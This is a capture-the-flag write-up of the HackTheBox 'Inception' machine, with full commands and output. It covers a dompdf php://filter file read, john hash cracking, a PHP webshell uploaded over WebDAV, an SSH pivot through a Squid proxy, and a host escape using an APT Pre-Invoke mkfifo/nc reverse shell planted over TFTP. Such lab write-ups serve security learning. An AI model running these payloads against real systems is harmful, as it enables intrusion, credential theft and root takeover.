# Inception: HackTheBox

---

## Metadata

| Field | Details |
| --- | --- |
| **Platform** | HackTheBox |
| **Machine** | Inception |
| **OS** | Linux |
| **Difficulty** | Hard |
| **Attacker IP** | 10.10.16.36 |
| **Target IP** | 10.129.42.190 |
| **Container IP** | 192.168.0.10 |
| **Host Gateway IP** | 192.168.0.1 |
| **Tools Used** | Nmap, proxychains, Firefox, Burp Suite, cadaver, john, curl, tftp, nc, static nmap binary, WebDAV PHP webshell |
| **Techniques** | Squid Proxy Abuse, dompdf LFI (CVE EDB-33004), php://filter base64 file read, Apache config enumeration, WebDAV credential extraction, md5crypt hash cracking, WebDAV PHP webshell upload, WordPress wp-config credential extraction, Proxychains SSH pivot, APT Pre-Invoke RCE via TFTP upload, Container escape to host |
| **Date** | July 2026 |

---

## Attack Chain Summary

```
Nmap → Port 80 (Apache) + Port 3128 (Squid proxy) →
HTML comment reveals /dompdf → dompdf v0.6.0 → LFI via php://filter →
Read /etc/passwd → Read /etc/apache2/sites-available/000-default.conf →
WebDAV path + auth file path discovered →
Read /var/www/html/webdav_test_inception/webdav.passwd →
md5crypt hash → john → babygurl69 →
cadaver upload phpbash.php → webshell RCE (no reverse shell: firewall blocks) →
URL-encode + Burp → cat wp-config.php → DB_PASSWORD = VwPddNh7xMZyDQoByQL4 →
proxychains nc confirms port 22 open locally →
proxychains ssh cobb@127.0.0.1 → User flag →
sudo -l → ALL → sudo su → root on container →
ip a → 192.168.0.10/24 → ping sweep → 192.168.0.1 alive →
static nmap via webdav → scan 192.168.0.1 → FTP + SSH + TFTP open →
tftp 192.168.0.1 → get /etc/crontab → apt update runs every 5 mins as root →
craft APT: Update: Pre-Invoke payload → tftp put to /etc/apt/apt.conf.d/pwn →
nc -lvnp 4444 inside container → wait 5 min → reverse shell from host as root →
cat /root/root.txt → Root flag
```

---

## Step 1: Reconnaissance

**Goal:** Identify open ports and services on the target.

```
Hackerpatel007_1@htb[/htb]$ nmap -sS -sV -sC -p 80,3128 -T4 10.129.42.190

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 13:29 -0400
Nmap scan report for 10.129.42.190
Host is up (0.16s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
```

**Output Analysis**

| Port | Service | Notes |
| --- | --- | --- |
| 80 | Apache 2.4.18 (Ubuntu) | Primary web server: enumerate thoroughly |
| 3128 | Squid HTTP Proxy 3.5.12 | Unauthenticated proxy: enables internal port scanning |

Only two ports externally visible. The Squid proxy on 3128 requires no authentication and is immediately useful: by routing traffic through it, internal services filtered from the outside become reachable. This is the pivoting mechanism for the entire machine. The immediate plan is: enumerate port 80 for a foothold, then use the Squid proxy to reach internally filtered services like SSH.

---

## Step 2: Squid Proxy Configuration for Internal Access

**Goal:** Configure proxychains to route traffic through the Squid proxy for internal port scanning.

The Squid proxy on port 3128 accepts connections without credentials. Adding it to proxychains allows all proxied tools (nmap, ssh, nc) to reach `127.0.0.1` on the target as if running locally on the server.

Added to `/etc/proxychains4.conf`:

```
Hackerpatel007_1@htb[/htb]$ sudo tail -5 /etc/proxychains4.conf

[ProxyList]
# Squid Proxy
http 10.129.42.190 3128
```

This will be used later to confirm whether SSH (port 22) is open on localhost: filtered from outside but reachable through the proxy.

---

## Step 3: Web Enumeration on Port 80

**Goal:** Identify the web application and any hints embedded in the page source.

Browsed to `http://10.129.42.190`: a basic "Inception" landing page. Viewed the page source and found a critical comment near line 1051:

```html
<!-- Todo: test dompdf on php 7.x -->
```

This reveals that dompdf: a PHP-based HTML-to-PDF conversion library: is installed somewhere on the server. Navigated to `http://10.129.42.190/dompdf/`: an Apache directory listing appeared showing the full dompdf installation.

Checked the version:

```
http://10.129.42.190/dompdf/VERSION
```

```
0.6.0
```

**dompdf version 0.6.0 is vulnerable to Local File Inclusion (LFI)**: EDB-33004. This version processes user-supplied URIs via its `input_file` parameter without sufficient sanitisation. Combined with PHP's `php://filter` wrapper, arbitrary files on the server can be read by base64-encoding their contents into a generated PDF.

---

## Step 4: dompdf LFI: Read /etc/passwd

**Goal:** Confirm the LFI vulnerability and read the system passwd file to enumerate users.

**Vulnerability (EDB-33004):** dompdf v0.6.0 accepts a URL-encoded `input_file` parameter and generates a PDF from the referenced content. By using the `php://filter/read=convert.base64-encode/resource=` wrapper, PHP's stream filter encodes any readable file as base64 before it is processed by dompdf: embedding the file's contents in the generated PDF. The PDF response can then be decoded to reveal the original file.

Sent the following request in Burp Suite Repeater:

```
GET /dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: 10.129.42.190
```

The response PDF contained base64-encoded content. Decoded in Burp's Inspector panel (Base64 decode):

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
cobb:x:1000:1000: /home/cobb:/bin/bash
```

**Key finding:** User `cobb` exists with a home directory at `/home/cobb` and a login shell: a valid target for SSH once credentials are found.

---

## Step 5: Read Apache Virtual Host Configuration

**Goal:** Read the Apache default site config to identify any additional web applications, directories, or credential paths.

```
GET /dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-available/000-default.conf HTTP/1.1
Host: 10.129.42.190
```

Decoded the base64 response: the virtual host configuration revealed:

```
Alias /webdav_test_inception /var/www/html/webdav_test_inception

<Location /webdav_test_inception>
    Options FollowSymLinks
    DAV On
    AuthType Basic
    AuthName "webdav test credential"
    AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
    Require valid-user
</Location>
```

**Critical findings:**

| Finding | Value |
| --- | --- |
| WebDAV path | `/webdav_test_inception` |
| Credential file path | `/var/www/html/webdav_test_inception/webdav.passwd` |

WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to read, write, and manage files on a remote web server: effectively a remote filesystem over HTTP. If credentials can be obtained, files (including PHP webshells) can be uploaded and executed.

---

## Step 6: Extract WebDAV Credentials via LFI

**Goal:** Read the WebDAV password file using the same dompdf LFI technique.

```
GET /dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd HTTP/1.1
Host: 10.129.42.190
```

Decoded the base64 response:

```
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```

The password is stored as an **Apache md5crypt hash** (`$apr1$` prefix). This is the format produced by `htpasswd`: a salted MD5-based hash used for HTTP Basic Auth credential files.

---

## Step 7: Crack the WebDAV Hash with John

**Goal:** Crack the md5crypt hash offline using John the Ripper.

```
Hackerpatel007_1@htb[/htb]$ echo 'webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0' > hash.txt

Hackerpatel007_1@htb[/htb]$ john hash.txt --wordlist=/home/kali/Desktop/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
babygurl69       (webdav_tester)
1g 0:00:00:00 DONE (2026-07-19 13:57) 1.123g/s 25186p/s
Session completed

Hackerpatel007_1@htb[/htb]$ john --show hash.txt
webdav_tester:babygurl69
1 password hash cracked, 0 left
```

**WebDAV Credentials:**

| Username | Password |
| --- | --- |
| `webdav_tester` | `babygurl69` |

---

## Step 8: WebDAV Access and PHP Webshell Upload

**Goal:** Use the cracked credentials to upload a PHP webshell via WebDAV and gain remote code execution.

Attempted to browse `http://10.129.42.190/webdav_test_inception/`: returned HTTP 403 Forbidden. Direct web access is blocked, but WebDAV protocol access using the same credentials works. Used `cadaver` (a command-line WebDAV client) to connect:

```
Hackerpatel007_1@htb[/htb]$ cadaver http://10.129.42.190/webdav_test_inception
Authentication required for webdav test credential on server '10.129.42.190':
Username: webdav_tester
Password: babygurl69
dav:/webdav_test_inception/> ls
Listing collection `/webdav_test_inception/': succeeded.
        webdav.passwd                         52  Nov  8  2017
```

Connected successfully. Uploaded a PHP webshell:

```
dav:/webdav_test_inception/> put revshell.php
Uploading revshell.php to `/webdav_test_inception/revshell.php':
Progress: [=============================>] 100.0% of 31 bytes succeeded.
```

**Important note on reverse shells:** A standard bash or nc reverse shell will not work here. The target has an outbound firewall blocking reverse connections to the attacker. The only viable option is a **command injection webshell** that accepts commands via a GET parameter and returns output in the HTTP response: no outbound connection needed.

The webshell:

```php
<?php system($_GET['cmd']); ?>
```

Tested execution:

```
http://10.129.42.190/webdav_test_inception/revshell.php?cmd=id
```

Response:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data`.

---

## Step 9: Enumerate the Web Root and Read wp-config.php

**Goal:** Identify WordPress installation and extract database credentials from wp-config.php.

Listed the web root:

```
http://10.129.42.190/webdav_test_inception/revshell.php?cmd=ls+-al+/var/www/html
```

```
total 8052
drwxr-xr-x 7 root     root      4096 Aug 10 2022 .
drwxr-xr-x 3 root     root      4096 Aug 10 2022 ..
-rw-r--r-- 1 root     root     17128 May  7 2017 LICENSE.txt
-rw-r--r-- 1 root     root      2307 May  7 2017 README.txt
drwxr-xr-x 6 root     root      4096 Aug 10 2022 assets
drwxrwxr-x 4 root     root      4096 Aug 10 2022 dompdf
drwxr-xr-x 2 root     root      4096 Aug 10 2022 images
-rw-r--r-- 1 root     root      2877 Nov  6 2017 index.html
-rw-r--r-- 1 root     root   8184961 Oct 31 2017 latest.tar.gz
drwxrwxr-x 2 www-data www-data  4096 Jul 19 16:14 webdav_test_inception
drwxr-xr-x 5 root     root      4096 Aug 10 2022 wordpress_4.8.3
```

A WordPress 4.8.3 installation is present. `wp-config.php` contains the database credentials. Because the command contains special characters and slashes, URL-encoded the command in Burp Decoder first:

```
cat /var/www/html/wordpress_4.8.3/wp-config.php
→ URL encoded: %63%61%74%20%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%77%6f%72%64%70%72%65%73%73%5f%34%2e%38%2e%33%2f%77%70%2d%63%6f%6e%66%69%67%2e%70%68%70
```

Sent request in Burp Repeater:

```
GET /webdav_test_inception/revshell.php?cmd=%63%61%74%20%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%77%6f%72%64%70%72%65%73%73%5f%34%2e%38%2e%33%2f%77%70%2d%63%6f%6e%66%69%67%2e%70%68%70 HTTP/1.1
Host: 10.129.42.190
```

Response included:

```php
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');
```

**Database credentials extracted:**

| Field | Value |
| --- | --- |
| `DB_USER` | `root` |
| `DB_PASSWORD` | `VwPddNh7xMZyDQoByQL4` |

MySQL is not running externally, but this password likely belongs to the `cobb` system user as well, as password reuse between WordPress DB and system accounts is common in CTF environments.

---

## Step 10: Confirm SSH Port via Proxychains

**Goal:** Verify that SSH is open on localhost (filtered externally, only reachable through Squid proxy).

Standard nmap through proxychains can give unreliable results with TCP connect scans on filtered ports. Used netcat as a more reliable probe:

```
Hackerpatel007_1@htb[/htb]$ proxychains nc -vz 127.0.0.1 22
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain ... 10.129.42.190:3128 ... 127.0.0.1:22 ... OK
127.0.0.1 [127.0.0.1] 22 (ssh) open : Operation now in progress
```

**Port 22 is open**: the Squid proxy successfully relayed the TCP connection to `127.0.0.1:22` on the target. SSH is running internally but filtered from direct external access.

---

## Step 11: SSH as cobb via Proxychains: User Flag

**Goal:** Use the WordPress database password to SSH in as cobb through the Squid proxy.

```
Hackerpatel007_1@htb[/htb]$ proxychains ssh cobb@127.0.0.1
[proxychains] Strict chain ... 10.129.42.190:3128 ... 127.0.0.1:22 ... OK
cobb@127.0.0.1's password: VwPddNh7xMZyDQoByQL4

Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$
```

Successfully authenticated as `cobb`. Captured user flag:

```
cobb@Inception:~$ cat user.txt
8482525359c2842c299d8908d125d7b0
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| User Flag | `8482525359c2842c299d8908d125d7b0` |

---

## Step 12: Privilege Escalation to root (Container)

**Goal:** Escalate from cobb to root on the current system.

```
cobb@Inception:~$ sudo -l
[sudo] password for cobb:
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
```

`cobb` has unrestricted `sudo` access: full root on this system:

```
cobb@Inception:~$ sudo su
root@Inception:/home/cobb# id
uid=0(root) gid=0(root) groups=0(root)
```

Root obtained. However, checking for the root flag:

```
root@Inception:/home/cobb# ls
crontab  pwn  tftpd-hpa  user.txt

root@Inception:~# ls
root.txt
root@Inception:~# cat root.txt
cat: root.txt: No such file or directory
```

The root flag file exists but is empty or inaccessible: the machine is running inside a **container**. The actual host is a separate machine at the network gateway.

---

## Step 13: Container Identification and Network Discovery

**Goal:** Identify the container's network position and discover the underlying host machine.

```
root@Inception:/home/cobb# ip a
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.0.10/24 brd 192.168.0.255 scope global eth0
```

The container is on `192.168.0.10/24`. The gateway (`192.168.0.1`) is the underlying host machine. Ran a ping sweep to confirm what's alive on the subnet:

```
root@Inception:/home/cobb# for i in {1..254}; do (ping -c 1 192.168.0.$i | grep "bytes from" &); done

64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from 192.168.0.10: icmp_seq=1 ttl=64 time=0.024 ms
```

Two hosts alive: `192.168.0.10` (this container) and `192.168.0.1` (the host machine / gateway). The root flag lives on `192.168.0.1`.

---

## Step 14: Port Scan the Host from the Container

**Goal:** Enumerate open services on the host gateway (192.168.0.1) from inside the container.

The container does not have nmap installed. Transferred a static nmap binary to the target via the WebDAV upload mechanism used earlier:

```
Hackerpatel007_1@htb[/htb]$ cadaver http://10.129.42.190/webdav_test_inception
dav:/webdav_test_inception/> put nmap
Uploading nmap to `/webdav_test_inception/nmap': succeeded.
```

Made it executable and ran it from the container:

```
root@Inception:/var/www/html/webdav_test_inception# chmod +x nmap
root@Inception:/var/www/html/webdav_test_inception# ./nmap -n -sT 192.168.0.1

Starting Nmap 6.49BETA1 at 2026-07-19 23:28 UTC
Nmap scan report for 192.168.0.1
Host is up (0.00013s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

MAC Address: FE:A2:AD:29:E1:AA (Unknown)
```

**Host services discovered:**

| Port | Service | Notes |
| --- | --- | --- |
| 21 | FTP | Anonymous login enabled: investigate |
| 22 | SSH | Restricted: no credentials for host yet |
| 53 | DNS | Name server |

---

## Step 15: FTP Anonymous Login and TFTP Discovery

**Goal:** Connect to the FTP service anonymously and enumerate accessible files.

From the container:

```
root@Inception:/home/cobb# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name: anonymous
331 Please specify the password.
Password: [blank]
230 Login successful.
ftp> ls
drwxr-xr-x    2 0        0            4096 Nov 06  2017 bin
drwxr-xr-x    9 0        0            4096 Nov 06  2017 boot
...
ftp> get /etc/crontab
```

Downloaded `/etc/crontab` from the host:

```
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m  h  dom mon dow user    command
17 *  * * *  root    cd / && run-parts --report /etc/cron.hourly
25 6  * * *  root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6  * * 7  root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * *  root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 * * * *  root    apt update 2>&1 >/var/log/apt/custom.log
30 23 * * *  root    apt upgrade -y 2>&1 >/dev/null
```

**Critical finding:**

```
*/5 * * * *  root    apt update 2>&1 >/var/log/apt/custom.log
```

**The host runs `apt update` as root every 5 minutes.** This is the privilege escalation vector.

While investigating further, checked `/etc/default/tftpd-hpa` from inside the container:

```
root@Inception:/home/cobb# cat tftpd-hpa
TFTP_USERNAME="root"
TFTP_DIRECTORY="/"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="--secure --create"
```

**TFTP is running on the host with `TFTP_DIRECTORY=/` and `--create` flag enabled.** This means:

- TFTP serves files from the filesystem root (`/`)
- The `--create` flag allows **uploading new files**: not just reading
- Combined with the apt crontab entry, uploading a malicious APT configuration file will get it executed as root in under 5 minutes

---

## Step 16: APT Pre-Invoke Root Shell via TFTP

**Goal:** Upload a malicious APT configuration file via TFTP to execute a reverse shell when apt update runs as root.

**Why this works:** APT supports a configuration directive `APT: Update: Pre-Invoke` that specifies commands to execute before running `apt update`. Any file placed in `/etc/apt/apt.conf.d/` is automatically loaded by APT. Since the crontab runs `apt update` as root every 5 minutes, any command in `Pre-Invoke` executes as root on the host.

Created the malicious APT config on the container (`/home/cobb/pwn`):

```
root@Inception:/home/cobb# cat pwn
APT: Update: Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.10 4444 >/tmp/f";};
```

**Payload breakdown:**

- `rm /tmp/f`: remove any existing named pipe
- `mkfifo /tmp/f`: create a named pipe (FIFO) at `/tmp/f`
- `cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.0.10 4444 > /tmp/f`: pipe shell I/O through nc back to the container's IP on port 4444

Started a netcat listener on the container:

```
root@Inception:/home/cobb# nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

Uploaded the payload file to the host via TFTP:

```
root@Inception:/home/cobb# tftp 192.168.0.1
tftp> put pwn /etc/apt/apt.conf.d/pwn
Sent 113 bytes in 0.0 seconds
tftp> quit
```

Waited up to 5 minutes for the cron job to trigger. Received the connection:

```
Connection from [192.168.0.1] port 4444 [tcp/*] accepted (family 2, sport 34780)
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell on the **host machine** (`192.168.0.1`) received.

---

## Step 17: Root Flag

**Goal:** Capture the root flag from the host machine.

```
# cd /root
# ls
root.txt
# cat root.txt
85d43c591205de0620e8ab952e46110d
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| User Flag | `8482525359c2842c299d8908d125d7b0` |
| Root Flag | `85d43c591205de0620e8ab952e46110d` |

---

## Lessons Learned

**1. HTML source code comments reveal internal components.**
The `<!-- Todo: test dompdf on php 7.x -->` comment in the page source was the entire foothold. Developers frequently leave TODO comments, version hints, and internal path references in production HTML. Reading source on every page encountered is non-negotiable.

**2. dompdf v0.6.0 LFI is a full arbitrary file read without authentication.**
The `php://filter/read=convert.base64-encode/resource=` wrapper combined with dompdf's unvalidated `input_file` parameter allows reading any file the web server user can access. The attack is unauthenticated, requires no special tooling, and is trivially exploitable through Burp. Any externally exposed dompdf installation should be version-checked immediately.

**3. Apache config files reveal the full internal application architecture.**
Reading `/etc/apache2/sites-available/000-default.conf` via the LFI revealed both the WebDAV path and the exact location of its password file. This single file enumeration step unlocked the entire next phase. When LFI is available, Apache, nginx, and lighttpd config files are always worth reading.

**4. Outbound firewall blocking reverse shells forces creative payload design.**
A standard bash reverse shell failed silently due to outbound firewall rules. The webshell `<?php system($_GET['cmd']); ?>` with URL-encoded commands was the correct approach: it requires no outbound connection and outputs everything in the HTTP response. Always test for firewall restrictions before assuming a reverse shell will work.

**5. The Squid proxy is a pivot, not just a proxy.**
The Squid proxy wasn't just a configuration hint: it was the mechanism that made SSH accessible. Internally, SSH was running on port 22 but was firewalled from external access. Routing through the Squid proxy bypassed the firewall entirely. Any unauthenticated proxy on a target should be tested for access to internal services.

**6. Password reuse between WordPress DB credentials and system users is common.**
The WordPress `DB_PASSWORD` was the SSH password for `cobb`. This pattern: where the same person set up both the WordPress installation and the system user account: appears frequently in both CTF and real-world assessments. Whenever a password is found in any config file, test it against every known username.

**7. An empty root flag inside a container is the container escape signal.**
When `cat root.txt` produces no output or "No such file or directory" after gaining root, and the hostname is non-standard (a random hex string or unusual name), the machine is almost certainly a container or VM. The immediate next step is always `ip a` to find the actual host subnet.

**8. TFTP with `--create` + apt Pre-Invoke is a reliable host escalation chain.**
The combination of: a world-writable TFTP server with `TFTP_DIRECTORY=/`, and an apt crontab running as root: creates a textbook APT Pre-Invoke escalation. Any `*/N * * * * root apt update` crontab entry is exploitable this way if there is any writable path to `/etc/apt/apt.conf.d/`. The 5-minute window is the longest part of this step.

---

## Full Attack Chain Reference

1. Ran `nmap -sS -sV -sC -p 80,3128`: identified Apache (80) and Squid proxy (3128)
2. Added Squid proxy to `/etc/proxychains4.conf` for internal port scanning
3. Browsed port 80: found `<!-- Todo: test dompdf on php 7.x -->` in source
4. Navigated to `/dompdf/VERSION`: confirmed dompdf v0.6.0 (LFI vulnerable: EDB-33004)
5. Sent LFI request via Burp: `php://filter/read=convert.base64-encode/resource=/etc/passwd`
6. Decoded base64 response: found user `cobb` in `/etc/passwd`
7. Read `/etc/apache2/sites-available/000-default.conf` via LFI: found WebDAV path and password file path
8. Read `/var/www/html/webdav_test_inception/webdav.passwd` via LFI: got `webdav_tester:$apr1$8rO7Smi4$...`
9. Cracked hash with `john --wordlist=rockyou.txt`: password: `babygurl69`
10. Connected to WebDAV via `cadaver`: uploaded `revshell.php` (`<?php system($_GET['cmd']); ?>`)
11. Accessed webshell at `/webdav_test_inception/revshell.php?cmd=id`: RCE as `www-data` confirmed
12. Reverse shell attempts failed: outbound firewall blocks connections
13. URL-encoded commands for Burp: read `/var/www/html/wordpress_4.8.3/wp-config.php`
14. Extracted `DB_PASSWORD = VwPddNh7xMZyDQoByQL4`
15. Ran `proxychains nc -vz 127.0.0.1 22`: confirmed SSH open internally
16. `proxychains ssh cobb@127.0.0.1` with password `VwPddNh7xMZyDQoByQL4`: shell as cobb
17. Captured user flag from `~/user.txt`
18. Ran `sudo -l`: `(ALL : ALL) ALL`: ran `sudo su` → root on container
19. Ran `ip a`: container at `192.168.0.10/24`, gateway at `192.168.0.1`
20. Ping sweep: confirmed `192.168.0.1` is alive
21. Uploaded static nmap binary via WebDAV: ran `./nmap -n -sT 192.168.0.1`
22. Found FTP (21), SSH (22), DNS (53) on host
23. FTP anonymous login to `192.168.0.1`: downloaded `/etc/crontab`
24. Found `*/5 * * * * root apt update`: apt runs as root every 5 minutes
25. Found `/etc/default/tftpd-hpa`: TFTP running with `--create` flag and `TFTP_DIRECTORY=/`
26. Created `pwn` file with `APT: Update: Pre-Invoke` mkfifo reverse shell to `192.168.0.10:4444`
27. Started `nc -lvnp 4444` on the container
28. Uploaded `pwn` via `tftp 192.168.0.1` → `put pwn /etc/apt/apt.conf.d/pwn`
29. Waited up to 5 minutes: cron triggered apt update → Pre-Invoke executed → root shell received from `192.168.0.1`
30. Navigated to `/root` → captured root flag

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -sS -sV -sC -p 80,3128 10.129.42.190` | Targeted scan on identified ports |
| `echo "http 10.129.42.190 3128" >> /etc/proxychains4.conf` | Add Squid proxy to proxychains |
| `curl http://10.129.42.190/dompdf/VERSION` | Check dompdf version |
| Burp: `GET /dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd` | LFI: read /etc/passwd |
| Burp: `input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-available/000-default.conf` | LFI: read Apache vhost config |
| Burp: `input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd` | LFI: extract WebDAV credential hash |
| `john hash.txt --wordlist=/home/kali/Desktop/rockyou.txt` | Crack md5crypt WebDAV hash |
| `cadaver http://10.129.42.190/webdav_test_inception` | Connect to WebDAV |
| `put revshell.php` (inside cadaver) | Upload PHP webshell |
| `GET /webdav_test_inception/revshell.php?cmd=id` | Test webshell RCE |
| Burp Decoder: URL-encode `cat /var/www/html/wordpress_4.8.3/wp-config.php` | Encode command for webshell |
| `proxychains nc -vz 127.0.0.1 22` | Confirm SSH open through Squid proxy |
| `proxychains ssh cobb@127.0.0.1` | SSH to target via proxy |
| `sudo -l` | Check sudo permissions |
| `sudo su` | Escalate to root on container |
| `ip a` | Identify container network / gateway IP |
| `for i in {1..254}; do (ping -c 1 192.168.0.$i | grep "bytes from" &); done` | Ping sweep internal subnet |
| `./nmap -n -sT 192.168.0.1` (static binary on container) | Port scan host from container |
| `ftp 192.168.0.1` → `get /etc/crontab` | Anonymous FTP: read host crontab |
| `cat /etc/default/tftpd-hpa` | Check TFTP config for --create flag |
| `nc -lvnp 4444` (on container) | Listener for host reverse shell |
| `tftp 192.168.0.1` → `put pwn /etc/apt/apt.conf.d/pwn` | Upload malicious APT config via TFTP |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
| --- | --- | --- |
| Exploit Public-Facing Application | T1190 | dompdf v0.6.0 LFI via php://filter: unauthenticated file read |
| File and Directory Discovery | T1083 | Read Apache config, passwd, WebDAV passwd via LFI |
| Credentials from Password Stores | T1552.001 | WebDAV md5crypt hash read via LFI; WordPress DB password from wp-config |
| Brute Force: Password Cracking | T1110.002 | john + rockyou cracking md5crypt hash |
| Server Software Component: Web Shell | T1505.003 | PHP webshell uploaded via WebDAV for RCE |
| Proxy: Multi-hop Proxy | T1090.003 | Squid proxy used to reach internally filtered SSH port 22 |
| Valid Accounts | T1078.003 | SSH login as cobb using WordPress DB password reuse |
| Abuse Elevation Control Mechanism: Sudo | T1548.003 | `sudo su`: cobb has unrestricted sudo access |
| Network Service Discovery | T1046 | Static nmap binary run from container to scan host 192.168.0.1 |
| Scheduled Task Abuse | T1053.003 | APT Pre-Invoke payload triggered by root crontab `apt update` every 5 minutes |
| Ingress Tool Transfer | T1105 | Static nmap binary uploaded via WebDAV; pwn file uploaded via TFTP |
